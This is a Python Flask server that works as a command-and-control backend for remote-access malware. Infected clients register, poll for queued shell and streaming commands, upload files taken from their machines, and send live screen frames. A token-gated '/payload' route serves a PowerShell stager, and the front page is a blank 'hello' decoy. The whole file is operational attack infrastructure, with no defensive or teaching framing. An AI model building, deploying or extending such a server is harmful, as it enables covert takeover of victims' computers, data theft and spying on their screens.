import os
import uuid
import time
import json
from datetime import datetime, timezone
from flask import Flask, request, jsonify, send_file, Response
from werkzeug.utils import secure_filename
import threading

app = Flask(__name__)

try:
    from flask_cors import CORS
    CORS(app, origins=["*"], supports_credentials=True)
except ImportError:
    print("Warning: flask_cors not installed.")

clients = {}
clients_lock = threading.RLock()
streaming_clients = {}

UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

USER_LOG_DIR = 'user'
USER_LOG_FILE = os.path.join(USER_LOG_DIR, 'saves.json')
if not os.path.exists(USER_LOG_DIR):
    os.makedirs(USER_LOG_DIR)


def _fmt_time(dt):
    return dt.strftime("%B %d, %Y %I:%M:%S %p") + " UTC"


def log_user_registration(client_id, ip):
    try:
        log_data = []
        if os.path.exists(USER_LOG_FILE):
            with open(USER_LOG_FILE, 'r') as f:
                try:
                    log_data = json.load(f)
                except (json.JSONDecodeError, FileNotFoundError):
                    log_data = []
        joined_time_str = _fmt_time(datetime.now(timezone.utc))
        existing = next((x for x in log_data if x.get("client_id") == client_id), None)
        if existing:
            existing["ip"] = ip
            existing["joined_time"] = joined_time_str
            existing["disconnected_time"] = None
        else:
            log_data.append({"client_id": client_id, "ip": ip, "joined_time": joined_time_str, "disconnected_time": None})
        with open(USER_LOG_FILE, 'w') as f:
            json.dump(log_data, f, indent=4)
    except Exception as e:
        print(f"[-] log save error: {e}")


def log_user_disconnection(client_id):
    try:
        log_data = []
        if os.path.exists(USER_LOG_FILE):
            with open(USER_LOG_FILE, 'r') as f:
                try:
                    log_data = json.load(f)
                except (json.JSONDecodeError, FileNotFoundError):
                    log_data = []
        disconnected_time_str = _fmt_time(datetime.now(timezone.utc))
        existing = next((x for x in log_data if x.get("client_id") == client_id), None)
        if existing:
            existing["disconnected_time"] = disconnected_time_str
        else:
            log_data.append({"client_id": client_id, "disconnected_time": disconnected_time_str})
        with open(USER_LOG_FILE, 'w') as f:
            json.dump(log_data, f, indent=4)
    except Exception as e:
        print(f"[-] log disconnect error: {e}")


def clean_clients():
    with clients_lock:
        now = time.time()
        dead = [cid for cid, d in clients.items() if now - d['last_seen'] > 60]
        for d in dead:
            del clients[d]
            streaming_clients.pop(d, None)
            log_user_disconnection(d)


def _resolve_uploaded_file(name):
    """Find the actual file on disk. Tries exact, then suffix match."""
    exact = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(name))
    if os.path.exists(exact):
        return exact
    # suffix search: server saved as {clientid}_{timestamp}_{original}
    safe_name = secure_filename(name)
    for f in os.listdir(app.config['UPLOAD_FOLDER']):
        if f.endswith("_" + safe_name) or f == safe_name:
            return os.path.join(app.config['UPLOAD_FOLDER'], f)
    return None


@app.route('/api/register', methods=['POST'])
def register():
    ip = request.remote_addr
    data = request.json or {}
    client_id = data.get('id')
    public_ip = data.get('public_ip', ip)
    if not client_id:
        client_id = str(uuid.uuid4())[:8]
    with clients_lock:
        if client_id not in clients:
            clients[client_id] = {
                "ip": public_ip,
                "last_seen": time.time(),
                "command_queue": [],
                "results": {},
                "streaming": False
            }
        else:
            clients[client_id]['ip'] = public_ip
            clients[client_id]['last_seen'] = time.time()
    log_user_registration(client_id, public_ip)
    return jsonify({"id": client_id, "status": "registered"})


@app.route('/api/disconnect', methods=['POST'])
def disconnect():
    data = request.json or {}
    client_id = data.get('id')
    if not client_id:
        return jsonify({"error": "No client id"}), 400
    with clients_lock:
        clients.pop(client_id, None)
        streaming_clients.pop(client_id, None)
    log_user_disconnection(client_id)
    return jsonify({"status": "disconnected"})


@app.route('/api/poll', methods=['POST'])
def poll():
    data = request.json or {}
    client_id = data.get('id')
    with clients_lock:
        if not client_id or client_id not in clients:
            return jsonify({"error": "Unknown client"}), 404
        clients[client_id]['last_seen'] = time.time()
        q = clients[client_id]['command_queue']
        if q:
            return jsonify({"command": q.pop(0)})
    return jsonify({"command": None})


@app.route('/api/result', methods=['POST'])
def result():
    data = request.json or {}
    client_id = data.get('id')
    cmd_id = data.get('cmd_id')
    output = data.get('output')
    try:
        if isinstance(output, str) and len(output) > 20000:
            output = output[:20000] + "\n...[truncated]"
    except Exception:
        pass
    with clients_lock:
        if not client_id or client_id not in clients:
            return jsonify({"error": "Unknown client"}), 404
        if cmd_id:
            clients[client_id]['results'][cmd_id] = output
    return jsonify({"status": "ok"})


@app.route('/api/upload', methods=['POST'])
def upload_file():
    try:
        client_id = request.form.get('id')
        cmd_id = request.form.get('cmd_id')
        is_stream_frame = request.form.get('is_stream_frame', 'false') == 'true'

        with clients_lock:
            if client_id != 'ADMIN' and (not client_id or client_id not in clients):
                return jsonify({"error": "Unknown client"}), 404

        if 'file' not in request.files:
            return jsonify({"error": "No file part"}), 400
        file = request.files['file']
        if file.filename == '':
            return jsonify({"error": "No selected file"}), 400

        if is_stream_frame:
            file_data = file.read()
            with clients_lock:
                if client_id not in streaming_clients:
                    streaming_clients[client_id] = {}
                streaming_clients[client_id]['last_frame'] = file_data
                streaming_clients[client_id]['frame_time'] = time.time()
            return jsonify({"status": "frame_received"})

        orig = secure_filename(file.filename) or "file.bin"
        base, ext = os.path.splitext(orig)
        saved_name = secure_filename(f"{client_id}_{int(time.time())}_{base}{ext}")
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], saved_name)
        file.save(filepath)

        if cmd_id:
            with clients_lock:
                if client_id in clients:
                    clients[client_id]['results'][cmd_id] = f"FILE_UPLOADED:{saved_name}"

        return jsonify({"status": "uploaded", "filename": saved_name})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/admin/list', methods=['GET'])
def admin_list():
    clean_clients()
    active = []
    with clients_lock:
        for cid, data in clients.items():
            active.append({"id": cid, "ip": data['ip'], "last_seen": int(time.time() - data['last_seen'])})
    return jsonify(active)


@app.route('/admin/command', methods=['POST'])
def admin_command():
    data = request.json or {}
    target_id = data.get('target_id')
    cmd_type = data.get('type')
    cmd_params = data.get('params', "")
    with clients_lock:
        if not target_id or target_id not in clients:
            return jsonify({"error": "Client not found"}), 404
        cmd_id = str(uuid.uuid4())[:8]
        command = {"id": cmd_id, "type": cmd_type, "params": cmd_params}
        q = clients[target_id]['command_queue']
        MAXQ = 20
        if len(q) >= MAXQ:
            dropped = False
            for i, c in enumerate(q):
                if c.get('type') == 'shell':
                    q.pop(i); dropped = True; break
            if not dropped:
                q.pop(0)
        if cmd_type == 'start_stream':
            clients[target_id]['streaming'] = True
            if target_id not in streaming_clients:
                streaming_clients[target_id] = {}
        elif cmd_type == 'stop_stream':
            clients[target_id]['streaming'] = False
            streaming_clients.pop(target_id, None)
        clients[target_id]['command_queue'].append(command)
    return jsonify({"cmd_id": cmd_id, "status": "queued"})


@app.route('/admin/response/<cmd_id>', methods=['GET'])
def admin_response(cmd_id):
    with clients_lock:
        for cid, data in clients.items():
            if cmd_id in data['results']:
                return jsonify({"status": "done", "output": data['results'].pop(cmd_id)})
    return jsonify({"status": "pending"})


@app.route('/admin/download_file/<path:filename>', methods=['GET'])
def admin_download(filename):
    try:
        filepath = _resolve_uploaded_file(filename)
        if not filepath:
            return jsonify({"error": "File not found", "requested": filename}), 404
        return send_file(filepath, as_attachment=True, download_name=os.path.basename(filepath), mimetype='application/octet-stream')
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/admin/stream_frame/<client_id>', methods=['GET'])
def admin_stream_frame(client_id):
    with clients_lock:
        if client_id in streaming_clients:
            frame_data = streaming_clients[client_id].get('last_frame')
            if frame_data:
                return Response(frame_data, mimetype='image/jpeg')
    return jsonify({"error": "No frame available"}), 404


@app.route('/payload/<path:token>', methods=['GET'])
def payload(token):
    if token != "nyx-7f3a9c":
        return jsonify({"error": "not found"}), 404
    p = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'payload.ps1')
    if not os.path.exists(p):
        return jsonify({"error": "payload missing"}), 404
    with open(p, 'rb') as f:
        data = f.read()
    return Response(data, mimetype='text/plain')


@app.route('/')
def index():
    return "<h1>hello</h1>"


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
